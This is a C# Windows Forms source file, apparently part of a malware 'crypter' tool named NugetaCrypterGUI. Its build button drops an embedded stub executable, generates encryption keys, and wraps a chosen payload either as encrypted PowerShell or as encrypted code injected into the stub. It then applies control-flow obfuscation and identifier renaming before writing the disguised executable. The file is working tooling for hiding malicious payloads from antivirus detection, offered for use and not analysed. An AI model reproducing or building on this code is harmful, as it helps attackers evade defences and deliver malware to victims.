using dnlib.DotNet;
using System;
using System.IO;
using System.Windows.Forms;

namespace NugetaCrypterGUI.Forms.SubForms
{
    public partial class SubBuild : Form
    {
        public SubBuild()
        {
            InitializeComponent();
        }

        private void SubBuild_Load(object sender, EventArgs e)
        {
            this.ControlBox = false;
        }

        private void StartBuildBtn_Click(object sender, EventArgs e)
        {
            File.WriteAllBytes(System.IO.Path.GetTempPath() + "Stub.exe", Files.stub);
            File.WriteAllText("Key.txt", Convert.ToBase64String(Randomize.Randomize.RandomIvKey(16)));
            File.WriteAllText("Iv.txt", Convert.ToBase64String(Randomize.Randomize.RandomIvKey(16)));
            if (Path.Batch)
            {
                File.WriteAllText("PowershellKey.txt", Convert.ToBase64String(Powershell.RandomKeyandIv.GenerateRandomBytes(32)));
                File.WriteAllText("PowershellIv.txt", Convert.ToBase64String(Powershell.RandomKeyandIv.GenerateRandomBytes(16)));
                Powershell.Build.Create(payloadText.Text);
            }
            else
            {
                File.Copy(System.IO.Path.GetTempPath() + "Stub.exe", "Stub.exe");
                Build.Build.AddCode("Stub.exe", Randomize.Randomize.SourceEncrypt().Item1, Randomize.Randomize.SourceEncrypt().Item2, Randomize.Randomize.SourceEncrypt().Item5, Randomize.Randomize.SourceEncrypt().Item6, Randomize.Randomize.SourceEncrypt().Item7);
                ModuleDefMD mod = ModuleDefMD.Load("Stub.exe");
                Obfuscation.ControlFlowObfuscation.Execute(mod);
                Obfuscation.RenamerPhase.ExecuteModuleRenaming(mod);
                Obfuscation.RenamerPhase.ExecuteNamespaceRenaming(mod);
                Obfuscation.RenamerPhase.ExecuteMethodRenaming(mod);
                Obfuscation.RenamerPhase.ExecuteClassRenaming(mod);
                Obfuscation.RenamerPhase.ExecuteFieldRenaming(mod);
                if (Path.Extension != null)
                    mod.Write(payloadText.Text + Path.Extension);
                else
                    mod.Write(payloadText.Text + ".exe");

                try { File.Delete("stub.exe"); } catch { }
            }

        }
    }
}
